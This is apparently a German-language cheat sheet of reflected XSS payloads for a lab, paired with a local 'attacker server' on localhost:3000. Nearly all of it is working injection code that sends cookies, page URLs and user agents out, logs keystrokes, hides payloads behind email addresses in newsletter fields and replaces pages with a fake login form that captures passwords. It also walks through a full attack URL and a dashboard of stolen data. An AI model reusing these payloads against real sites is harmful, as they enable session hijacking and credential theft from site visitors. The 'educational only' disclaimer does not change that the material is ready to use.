# Reflected XSS Payloads (mit Attacker Server)

## Hinweis
Diese Payloads verwenden den lokalen Attacker Server auf `http://localhost:3000`.
Server muss gestartet sein: `cd attacker-server && npm start`

⚠️ **NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**

---

## Cookie-Diebstahl mit Server

### Cookies an Server senden (fetch)

```html
<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### Cookies an Server senden (Image)

```html
<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
```

### Cookies an Server senden (XMLHttpRequest)

```html
<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','http://localhost:3000/steal?c='+document.cookie);x.send()">
```

### Mit URL-Encoding

```html
<img src=x onerror="fetch('http://localhost:3000/steal?c='+encodeURIComponent(document.cookie))">
```

### Cookies + URL + UserAgent (POST)

```html
<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
```

---

## Keylogger mit Server

### Keylogger der an Server sendet (alle 20 Zeichen)

```html
<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k));k=''}}">
```

### Keylogger mit kürzerer Übertragung (alle 10 Zeichen)

```html
<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>100){new Image().src='http://localhost:3000/keys?d='+k;k=''}}">
```

### Keylogger mit sofortiger Übertragung (jeder Tastendruck)

```html
<img src=x onerror="document.onkeypress=function(e){fetch('http://localhost:3000/keys?d='+e.key)}">
```

---

## Newsletter Payloads (mit @ und Server)

### E-Mail mit Cookie-Diebstahl (fetch)

```html
test@test.de<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### E-Mail mit Cookie-Diebstahl (Image)

```html
mail@example.com<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
```

### E-Mail mit vollständigen Daten (POST)

```html
user@domain.de<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
```

### E-Mail mit Keylogger

```html
test@test.de<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
```

---

## Kombinations-Angriffe

### Cookie-Diebstahl + Phishing Login-Form

```html
<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie);document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px\"><h2 style=\"text-align:center\">Login</h2><form onsubmit=\"fetch(\\\'http://localhost:3000/keys?d=email:\\\'+document.getElementById(\\\'e\\\').value+\\\',pass:\\\'+document.getElementById(\\\'p\\\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><input id=\"p\" type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer\">Login</button></form></div>'">
```

### Cookie-Diebstahl + Keylogger gleichzeitig

```html
<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie);var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
```

---

## Testing

1. **Server starten:**
   ```bash
   cd attacker-server
   npm install
   npm start
   ```

2. **Dashboard öffnen:**
   - Browser: `http://localhost:3000/dashboard`

3. **XSS Payload verwenden:**
   - Z.B. in Suchfeld: `<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">`

4. **Gestohlene Daten ansehen:**
   - Im Dashboard erscheinen die Daten sofort
   - Auto-Refresh alle 5 Sekunden
   - Console zeigt auch Logs

---

## Wichtige URLs

- Server Hauptseite: `http://localhost:3000`
- Dashboard: `http://localhost:3000/dashboard`
- Cookie Steal Endpoint: `http://localhost:3000/steal?c=...`
- Keylogger Endpoint: `http://localhost:3000/keys?d=...`

---

## Beispiel: Vollständiger Angriff

**URL in Browser eingeben:**
```
http://localhost:8080/index.html?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

**Was passiert:**
1. XSS Payload wird ausgeführt
2. Cookies werden an Attacker Server gesendet
3. Im Dashboard erscheinen die gestohlenen Cookies
4. Console zeigt Details an

**Im Dashboard siehst du:**
- Alle gestohlenen Cookies
- Zeitstempel
- IP-Adresse
- User-Agent
- Weitere Daten je nach Payload
